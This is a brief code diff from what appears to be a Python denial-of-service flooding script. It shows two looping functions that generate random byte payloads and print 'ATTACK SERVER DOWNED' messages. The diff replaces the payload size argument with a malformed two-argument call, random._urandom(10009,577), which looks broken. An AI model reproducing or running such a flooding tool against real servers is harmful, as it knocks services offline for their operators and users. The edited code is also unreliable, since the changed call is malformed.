@@ -61,7 +61,7 @@ times = args['times']
 threads = args['threads']
 
 def run():
-	data = random._urandom(threads)
+	data = random._urandom(10009,577)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -74,7 +74,7 @@ def run():
 			print("[!] ATTACK SERVER DOWNED!!!")
 
 def run2():
-	data = random._urandom(threads)
+	data = random._urandom(10009,577)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
